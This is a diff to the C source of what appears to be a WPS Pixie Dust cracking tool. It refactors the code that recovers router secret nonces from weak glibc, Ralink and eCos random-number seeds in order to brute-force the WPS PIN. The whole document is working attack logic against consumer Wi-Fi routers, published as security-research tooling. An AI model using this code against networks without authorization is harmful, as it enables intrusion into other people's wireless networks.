@@ -293,6 +293,128 @@ unsigned int hardware_concurrency()
 #endif
 }
 
+int find_rtl_es(struct global *wps, char* pin)
+{
+	uint_fast8_t found_p_mode = NONE;
+	struct glibc_prng glibc_prng;
+
+	int32_t res;
+	int i = 0; /* Must hold MODE3_TRIES */
+	uint8_t tmp_s_nonce[16];
+
+	DEBUG_PRINT("Trying forward in time");
+
+	do {
+		i++;
+		glibc_seed(&glibc_prng, wps->nonce_seed + i);
+		for (uint_fast8_t j = 0; j < 4; j++) {
+			uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
+			memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
+		}
+		memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
+		wps->s1_seed = wps->nonce_seed + i;
+		wps->s2_seed = wps->nonce_seed + i;
+
+		DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
+		DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+		DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
+		DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+		uint_fast8_t r = crack(wps, pin);
+		if (r == PIN_FOUND) {
+			found_p_mode = RTL819x;
+			DEBUG_PRINT("Pin found");
+		}
+		else if (r == PIN_ERROR) {
+			if (i == 1) {
+				memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
+				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
+			}
+			else {
+				memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
+				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
+			}
+			wps->s1_seed = wps->nonce_seed + i - 1;
+			wps->s2_seed = wps->nonce_seed + i;
+
+			DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
+			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
+			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+			uint_fast8_t r2 = crack(wps, pin);
+			if (r2 == PIN_FOUND) {
+				found_p_mode = RTL819x;
+				DEBUG_PRINT("Pin found");
+			}
+			else if (r2 == MEM_ERROR) {
+				return -MEM_ERROR;
+			}
+		}
+		else if (r == MEM_ERROR) {
+			return -MEM_ERROR;
+		}
+	} while (found_p_mode == NONE && i <= MODE3_TRIES);
+
+	if (found_p_mode == NONE) {
+		DEBUG_PRINT("Trying backwards in time");
+		i = 0;
+		do {
+			i++;
+			glibc_seed(&glibc_prng, wps->nonce_seed - i);
+			for (uint_fast8_t j = 0; j < 4; j++) {
+				uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
+				memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
+			}
+			memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
+			wps->s1_seed = wps->nonce_seed - i;
+			wps->s2_seed = wps->nonce_seed - i;
+
+			DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
+			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
+			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+			uint_fast8_t r = crack(wps, pin);
+			if (r == PIN_FOUND) {
+				found_p_mode = RTL819x;
+				DEBUG_PRINT("Pin found");
+			}
+			else if (r == PIN_ERROR) {
+				if (i == 1) {
+					memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
+					memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
+				}
+				else {
+					memcpy(wps->e_s2, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
+					memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
+				}
+				wps->s1_seed = wps->nonce_seed - i;
+				wps->s2_seed = wps->nonce_seed - i + 1;
+
+				DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
+				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+				DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
+				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+				uint_fast8_t r2 = crack(wps, pin);
+				if (r2 == PIN_FOUND) {
+					found_p_mode = RTL819x;
+					DEBUG_PRINT("Pin found");
+				}
+				else if (r2 == MEM_ERROR) {
+					return -MEM_ERROR;
+				}
+			}
+			else if (r == MEM_ERROR) {
+				return -MEM_ERROR;
+			}
+		} while (found_p_mode == NONE && i <= MODE3_TRIES);
+	}
+	return found_p_mode;
+}
+
+
 int main(int argc, char **argv)
 {
 	struct global *wps;
@@ -927,9 +1049,10 @@ usage_err:
 	uint_fast8_t found_p_mode = NONE;
 	char pin[WPS_PIN_LEN + 1];
 	uint32_t seed;
-	uint32_t nonce_seed = 0;
-	uint32_t s1_seed = 0;
-	uint32_t s2_seed = 0;
+
+	wps->nonce_seed = 0;
+	wps->s1_seed = 0;
+	wps->s2_seed = 0;
 
 	/* Main loop */
 	while (!found_p_mode && k < MODE_LEN && p_mode[k] != NONE) {
@@ -954,9 +1077,9 @@ usage_err:
 
 			if (!found_p_mode) {
 				init_crack_jobs(wps, RT);
-				nonce_seed = collect_crack_jobs();
-				if (nonce_seed != 0) {
-					unsigned lfsr = bit_revert(nonce_seed);
+				wps->nonce_seed = collect_crack_jobs();
+				if (wps->nonce_seed != 0) {
+					unsigned lfsr = bit_revert(wps->nonce_seed);
 					int k = 8 * 32;
 					while (k--) {
 						unsigned int lsb_mask = ~(lfsr & 1) + 1;
@@ -966,10 +1089,10 @@ usage_err:
 					}
 					struct ralink_randstate prng;
 					prng.sreg = bit_revert(lfsr);
-					s1_seed = prng.sreg;
+					wps->s1_seed = prng.sreg;
 					for (int i = 0; i < WPS_NONCE_LEN; i++)
 						wps->e_s1[i] = ralink_randbyte(&prng);
-					s2_seed = prng.sreg;
+					wps->s2_seed = prng.sreg;
 					for (int i = 0; i < WPS_NONCE_LEN; i++)
 						wps->e_s2[i] = ralink_randbyte(&prng);
 
@@ -1004,22 +1127,22 @@ usage_err:
 						break;
 				}
 				if (i == WPS_NONCE_LEN) { /* Seed found */
-					nonce_seed = index;
+					wps->nonce_seed = index;
 
-					s1_seed = seed;
+					wps->s1_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
 						wps->e_s1[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);
-					s2_seed = seed;
+					wps->s2_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
 						wps->e_s2[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);
 
-					DEBUG_PRINT("Seed found %u", nonce_seed);
+					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
 					break;
 				}
 				index++;
 			} while (!(index & 0x02000000));
 
-			if (nonce_seed) { /* Seed found */
+			if (wps->nonce_seed) { /* Seed found */
 
 				DEBUG_PRINT("Trying with E-S1: ");
 				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
@@ -1093,125 +1216,13 @@ usage_err:
 						}
 						#endif
 
-						nonce_seed = collect_crack_jobs();
+						wps->nonce_seed = collect_crack_jobs();
 
-						struct glibc_prng glibc_prng;
+						if (wps->nonce_seed) { /* Seed found */
+							found_p_mode = find_rtl_es(wps, pin);
+							if (found_p_mode == -MEM_ERROR)
+								goto memory_err;
 
-						if (nonce_seed) { /* Seed found */
-							int32_t res;
-							int i = 0; /* Must hold MODE3_TRIES */
-							uint8_t tmp_s_nonce[16];
-
-							DEBUG_PRINT("Trying forward in time");
-
-							do {
-								i++;
-								glibc_seed(&glibc_prng, nonce_seed + i);
-								for (uint_fast8_t j = 0; j < 4; j++) {
-									uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
-									memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
-								}
-								memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
-								s1_seed = nonce_seed + i;
-								s2_seed = nonce_seed + i;
-
-								DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
-								DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-								DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
-								DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-								uint_fast8_t r = crack(wps, pin);
-								if (r == PIN_FOUND) {
-									found_p_mode = RTL819x;
-									DEBUG_PRINT("Pin found");
-								}
-								else if (r == PIN_ERROR) {
-									if (i == 1) {
-										memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
-										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-									}
-									else {
-										memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
-										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
-									}
-									s1_seed = nonce_seed + i - 1;
-									s2_seed = nonce_seed + i;
-
-									DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
-									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-									DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
-									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-									uint_fast8_t r2 = crack(wps, pin);
-									if (r2 == PIN_FOUND) {
-										found_p_mode = RTL819x;
-										DEBUG_PRINT("Pin found");
-									}
-									else if (r2 == MEM_ERROR) {
-										goto memory_err;
-									}
-								}
-								else if (r == MEM_ERROR) {
-									goto memory_err;
-								}
-							} while (found_p_mode == NONE && i <= MODE3_TRIES);
-
-							if (found_p_mode == NONE) {
-								DEBUG_PRINT("Trying backwards in time");
-
-								i = 0;
-								do {
-									i++;
-									glibc_seed(&glibc_prng, nonce_seed - i);
-									for (uint_fast8_t j = 0; j < 4; j++) {
-										uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
-										memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
-									}
-									memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
-									s1_seed = nonce_seed - i;
-									s2_seed = nonce_seed - i;
-
-									DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
-									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-									DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
-									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-									uint_fast8_t r = crack(wps, pin);
-									if (r == PIN_FOUND) {
-										found_p_mode = RTL819x;
-										DEBUG_PRINT("Pin found");
-									}
-									else if (r == PIN_ERROR) {
-										if (i == 1) {
-											memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
-											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-										}
-										else {
-											memcpy(wps->e_s2, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
-											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
-										}
-										s1_seed = nonce_seed - i;
-										s2_seed = nonce_seed - i + 1;
-
-										DEBUG_PRINT("Trying (%10u) with E-S1: ", s1_seed);
-										DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-										DEBUG_PRINT("Trying (%10u) with E-S2: ", s2_seed);
-										DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-										uint_fast8_t r2 = crack(wps, pin);
-										if (r2 == PIN_FOUND) {
-											found_p_mode = RTL819x;
-											DEBUG_PRINT("Pin found");
-										}
-										else if (r2 == MEM_ERROR) {
-											goto memory_err;
-										}
-									}
-									else if (r == MEM_ERROR) {
-										goto memory_err;
-									}
-								} while (found_p_mode == NONE && i <= MODE3_TRIES);
-							}
 						}
 
 						if (found_p_mode == NONE && !wps->bruteforce) {
@@ -1241,23 +1252,23 @@ usage_err:
 						break;
 				}
 				if (i == WPS_NONCE_LEN) { /* Seed found */
-					nonce_seed = index;
+					wps->nonce_seed = index;
 
-					s1_seed = seed;
+					wps->s1_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
 						wps->e_s1[i] = (uint8_t) ecos_rand_simplest(&seed);
 
-					s2_seed = seed;
+					wps->s2_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
 						wps->e_s2[i] = (uint8_t) ecos_rand_simplest(&seed);
 
-					DEBUG_PRINT("Seed found %u", nonce_seed);
+					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
 					break;
 				}
 				index++;
 			} while (index != 0xffffffff);
 
-			if (nonce_seed) { /* Seed found */
+			if (wps->nonce_seed) { /* Seed found */
 
 				DEBUG_PRINT("Trying with E-S1: ");
 				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
@@ -1289,23 +1300,23 @@ usage_err:
 						break;
 				}
 				if (i == WPS_NONCE_LEN) { /* Seed found */
-					nonce_seed = index;
+					wps->nonce_seed = index;
 
-					s1_seed = seed;
+					wps->s1_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
 						wps->e_s1[i] = (uint8_t) ecos_rand_knuth(&seed);
 
-					s2_seed = seed;
+					wps->s2_seed = seed;
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
 						wps->e_s2[i] = (uint8_t) ecos_rand_knuth(&seed);
 
-					DEBUG_PRINT("Seed found %u", nonce_seed);
+					DEBUG_PRINT("Seed found %u", wps->nonce_seed);
 					break;
 				}
 				index++;
 			} while (index != 0xffffffff);
 
-			if (nonce_seed) { /* Seed found */
+			if (wps->nonce_seed) { /* Seed found */
 
 				DEBUG_PRINT("Trying with E-S1: ");
 				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
@@ -1350,29 +1361,29 @@ usage_err:
 						struct tm ts;
 						char buffer[30];
 
-						printf("\n [*] Seed N1:  %u", nonce_seed);
-						seed_time = nonce_seed;
+						printf("\n [*] Seed N1:  %u", wps->nonce_seed);
+						seed_time = wps->nonce_seed;
 						ts = *gmtime(&seed_time);
 						strftime(buffer, 30, "%c", &ts);
 						printf(" (%s UTC)", buffer);
-						printf("\n [*] Seed ES1: %u", s1_seed);
-						seed_time = s1_seed;
+						printf("\n [*] Seed ES1: %u", wps->s1_seed);
+						seed_time = wps->s1_seed;
 						ts = *gmtime(&seed_time);
 						strftime(buffer, 30, "%c", &ts);
 						printf(" (%s UTC)", buffer);
-						printf("\n [*] Seed ES2: %u", s2_seed);
-						seed_time = s2_seed;
+						printf("\n [*] Seed ES2: %u", wps->s2_seed);
+						seed_time = wps->s2_seed;
 						ts = *gmtime(&seed_time);
 						strftime(buffer, 30, "%c", &ts);
 						printf(" (%s UTC)", buffer);
 					}
 					else {
-						if (found_p_mode == RT && nonce_seed == 0)
+						if (found_p_mode == RT && wps->nonce_seed == 0)
 							printf("\n [*] Seed N1:  -");
 						else
-							printf("\n [*] Seed N1:  0x%08x", nonce_seed);
-						printf("\n [*] Seed ES1: 0x%08x", s1_seed);
-						printf("\n [*] Seed ES2: 0x%08x", s2_seed);
+							printf("\n [*] Seed N1:  0x%08x", wps->nonce_seed);
+						printf("\n [*] Seed ES1: 0x%08x", wps->s1_seed);
+						printf("\n [*] Seed ES2: 0x%08x", wps->s2_seed);
 					}
 				}
 			}
